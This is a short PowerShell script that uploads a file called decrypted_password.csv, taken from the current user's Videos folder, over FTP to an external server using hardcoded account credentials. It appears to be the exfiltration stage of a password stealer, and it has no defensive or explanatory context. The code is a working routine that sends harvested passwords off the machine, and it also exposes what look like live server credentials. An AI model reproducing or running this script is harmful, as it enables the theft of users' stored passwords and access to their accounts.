# Define the file path and FTP details
$localFilePath = "C:\Users\$env:USERNAME\Videos\decrypted_password.csv"
$ftpServer = "us-east-1.sftpcloud.io"
$ftpUsername = "86cb675c25c04e65a4e653a6f618152d"
$ftpPassword = "uaaAKNB3CNvaSWfcnu2CVAwRCFTACJPR"
$ftpUri = "ftp://$ftpServer//decrypted_password.csv"

# Create a WebClient instance
$webClient = New-Object System.Net.WebClient

# Set the credentials for the FTP operation
$webClient.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)

try {
    # Upload the file
    $webClient.UploadFile($ftpUri, "STOR", $localFilePath)
    Write-Host "File uploaded successfully to $ftpUri"
}
catch {
    Write-Error "An error occurred: $_"
}
finally {
    # Clean up
    $webClient.Dispose()
}
